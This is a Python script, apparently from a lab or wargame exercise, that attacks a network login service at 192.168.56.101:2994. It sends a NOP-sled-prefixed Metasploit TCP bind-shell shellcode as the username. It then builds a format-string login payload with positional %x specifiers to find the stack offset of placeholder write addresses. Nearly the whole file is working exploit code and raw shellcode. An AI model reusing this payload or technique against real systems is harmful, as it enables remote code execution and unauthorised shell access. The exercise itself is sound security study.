import socket
import sys

"""
This program is used for searching the offset from the start position of the internal stack pointer to the dummy string represented
as "BBBBCCCCDDDDEEEE" which is part of the format string and located on the  stack.
Those values are placeholders for bytes representing the addresses of 4 bytes the user wants to write to. 

argv[1] - starting point on the stack
argv[2] - how many places to show after the starting point
argv[3] - custom padding for alignment adjustment
"""

def main():

	HOST = '192.168.56.101'
	PORT = 2994

	# dummy values for stack locating and alignment adjusting
	byte_address_1 = "BBBB"
	byte_address_2 = "CCCC"
	byte_address_3 = "DDDD"
	byte_address_4 = "EEEE"


	# Metasploit TCP bind shellcode at port 4444 prepended with NOP-sled
	shellcode = "\x90" * 24
	shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
	            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
	            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
	            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
	            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
	            "\x0b\xcd\x80"

	# String taken from syslog used as template for tailoring format string size
	format_str = "Login from 192.168.56.1:57036 as [] with password []"

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	
	username = shellcode + "\n"

	# Prepended with "AAAAAAA" for memory alignment
	login = "A" * int(sys.argv[3]) + byte_address_1 + byte_address_2 + byte_address_3 + byte_address_4

	j = int(sys.argv[1])
	for i in range(int(sys.argv[2])):
		login += ".%" + str(j) + "$08x"
		j += 1

	login += "\n"

	print(login)

	sock.send("username " + username)
	print(sock.recv(1024))
	sock.send("login " + login)
	print(sock.recv(1024))
	sock.close()

if __name__ == "__main__":
	main()
